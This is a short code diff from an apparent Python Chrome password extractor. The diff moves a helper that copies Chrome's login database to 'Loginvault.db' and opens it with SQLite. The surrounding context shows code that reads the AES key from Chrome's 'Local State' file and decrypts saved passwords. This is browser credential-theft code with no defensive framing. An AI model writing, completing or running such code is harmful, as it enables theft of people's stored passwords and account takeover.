@@ -13,6 +13,12 @@ CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
 
 
+def get_db_connection(chrome_path_login_db):
+    print(chrome_path_login_db)
+    shutil.copy2(chrome_path_login_db, "Loginvault.db")
+    return sqlite3.connect("Loginvault.db")
+
+
 # 获取明文存储在 CHROME_PATH_LOCAL_STATE 的 AES_KEY
 def get_k():
     with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
@@ -43,12 +49,6 @@ def decrypt_password(ciphertext, key):
     AES_dec_cipher = generate_cipher(key, iv)
     dec_passwd = AES_dec_cipher.decrypt(enc_passwd).decode()
     return dec_passwd
-
-
-def get_db_connection(chrome_path_login_db):
-    print(chrome_path_login_db)
-    shutil.copy2(chrome_path_login_db, "Loginvault.db")
-    return sqlite3.connect("Loginvault.db")
 
 
 if __name__ == '__main__':
